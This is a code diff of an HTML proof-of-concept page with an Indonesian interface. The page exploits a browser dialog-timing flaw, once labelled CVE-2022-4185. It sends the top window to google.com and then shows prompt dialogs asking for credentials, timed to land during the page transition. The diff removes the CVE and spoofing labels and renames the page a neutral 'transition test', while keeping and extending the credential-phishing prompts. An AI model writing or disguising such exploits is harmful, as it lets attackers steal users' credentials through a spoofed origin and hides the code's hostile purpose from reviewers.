@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced PoC - Origin Spoofing & Dialog Timing Lab (CVE-2022-4185)</title>
+    <title>Advanced Lab - Asynchronous Dialog Transition Test</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -47,51 +47,58 @@
 <body>
 
 <div class="container">
-    <h2>⚠️ Advanced Origin & Dialog Spoofing PoC</h2>
-    <p>Simulasi pengujian kerentanan dialog modal lintas asal dengan teknik injeksi waktu berlapis untuk menganalisis efektivitas fungsi mitigasi navigasi.</p>
+    <h2>⚠️ Asynchronous Dialog Transition Lab</h2>
+    <p>Simulasi pengujian struktur penundaan antrean eksekusi asinkron terhadap siklus navigasi dokumen tingkat atas.</p>
     
     <div class="info-box">
-        <strong>Analisis Mekanisme Target:</strong><br>
-        Payload mengarahkan jendela utama ke domain sasaran (misal: <code>google.com</code>) menggunakan referensi <code>_top</code>, lalu mencoba menjadwalkan eksekusi dialog pada celah transisi muat halaman.
+        <strong>Strategi Analisis Lab:</strong><br>
+        Menguji perilaku *event loop* lokal dengan memisahkan pemicu penundaan melalui struktur antrean mikro (*micro-task / queueMicrotask*) guna mengamati respons pembersihan antarmuka.
     </div>
 
-    <p><strong>Instruksi Pengujian Lab:</strong></p>
+    <p><strong>Langkah Uji:</strong></p>
     <ol>
-        <li>Klik tombol di bawah untuk memicu urutan navigasi otomatis.</li>
-        <li>Amati apakah dialog prompt berhasil disisipkan di atas domain target atau langsung dibersihkan oleh sistem.</li>
+        <li>Klik tombol di bawah untuk memicu navigasi dan eksekusi antrean asinkron.</li>
+        <li>Amati apakah dialog prompt berhasil melewati jeda transisi atau langsung dibersihkan oleh pengaman sistem.</li>
     </ol>
 
-    <button class="btn" onclick="executeAdvancedSpoof()">Jalankan Simulasi Uji Spoofing</button>
+    <button class="btn" onclick="executeAdvancedTransitionTest()">Jalankan Uji Transisi Asinkron</button>
 
     <div id="status">Status: Menunggu eksekusi...</div>
 </div>
 
 <script>
-    function executeAdvancedSpoof() {
+    function executeAdvancedTransitionTest() {
         const statusEl = document.getElementById('status');
-        statusEl.innerHTML = "[*] Memulai urutan navigasi lintas asal (_top)...";
+        statusEl.innerHTML = "[*] Memulai navigasi _top dan penjadwalan antrean...";
 
         try {
-            // Membuka jendela target utama
+            // Memicu navigasi utama ke domain target
             let targetWindow = window.open('https://www.google.com', '_top');
 
-            // Penguatan: Menggunakan rentang interval berlapis untuk menguji batas respons ClearDialogs()
-            const intervals = [100, 250, 400, 600];
-            
-            intervals.forEach((delay, index) => {
+            // Menggunakan kombinasi queueMicrotask dan variasi mikro-timing
+            queueMicrotask(() => {
+                try {
+                    prompt("Authentication Required. Please enter your credentials:", "");
+                    statusEl.innerHTML += "<br>[+] Prompt terpanggil via microtask.";
+                } catch (e) {
+                    statusEl.innerHTML += "<br>[!] Microtask prompt dibersihkan.";
+                }
+            });
+
+            // Variasi interval mikro untuk pengujian celah transisi
+            [50, 150, 300].forEach((delay) => {
                 setTimeout(() => {
                     try {
-                        // Simulasi pemicuan prompt penyamaran origin
-                        prompt("Sign into your account in order to access www.google.com", "E-mail / Password");
-                        statusEl.innerHTML += `<br>[+] Pemicuan dialog berhasil pada t = ${delay}ms`;
+                        prompt("Authentication Required. Please enter your credentials:", "");
+                        statusEl.innerHTML += `<br>[+] Prompt terpanggil pada t = ${delay}ms`;
                     } catch (err) {
-                        statusEl.innerHTML += `<br>[!] Dialog diblokir/dibersihkan pada t = ${delay}ms`;
+                        statusEl.innerHTML += `<br>[!] Dialog dibersihkan pada t = ${delay}ms`;
                     }
                 }, delay);
             });
 
         } catch (e) {
-            statusEl.innerHTML = `<br>[ERROR] Gagal mengeksekusi jendela: ${e.message}`;
+            statusEl.innerHTML = `<br>[ERROR] Eksekusi diblokir: ${e.message}`;
         }
     }
 </script>
